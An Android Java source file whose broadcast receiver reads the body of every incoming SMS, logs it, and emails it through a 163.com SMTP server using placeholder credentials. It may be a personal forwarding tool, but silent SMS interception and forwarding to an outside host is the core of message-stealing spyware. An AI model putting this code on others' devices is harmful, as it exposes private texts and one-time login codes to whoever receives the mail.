package sendemail;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsRecevier extends BroadcastReceiver {

	public SmsRecevier() {
		Log.v("TAG", "SmsRecevier create");
	}

	@Override
	public void onReceive(Context context, Intent intent) {
        Log.v("TAG", "SmsRecevier onReceive");

		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        Log.v("TAG", pdus.length+"");
		if (pdus != null && pdus.length > 0) {
			SmsMessage[] messages = new SmsMessage[pdus.length];
            Log.v("TAG", messages.length+"");
			for (int i = 0; i < pdus.length; i++) {
				byte[] pdu = (byte[]) pdus[i];
				messages[i] = SmsMessage.createFromPdu(pdu);
                Log.v("TAG", messages[i].getDisplayMessageBody());
			}

			for (SmsMessage message : messages) {
				String content = message.getMessageBody();// 得到短信内容
				String sender = message.getOriginatingAddress();// 得到发信息的号码

                Log.v("send content", content);
				try {
					final MailSenderInfo mailInfo = MailSenderInfo.getInstance();
					mailInfo.setMailHost("smtp.163.com");
					mailInfo.setMailServerPort("25");
					mailInfo.setValidate(true);
					mailInfo.setUserName("yourusername");
					mailInfo.setPassword("yourpassword");
					mailInfo.setFromAddress("c4code@163.com");
					mailInfo.setSubject("转发短信");
					mailInfo.setContent(content);

					SimpleMailSender sms = new SimpleMailSender();
					sms.sendTextMail(mailInfo);
                    Log.v("SendMail", "mail sent");
				} catch (Exception e) {
					Log.e("SendMail", e.getMessage(), e);
				}
			}
		}
	}
}
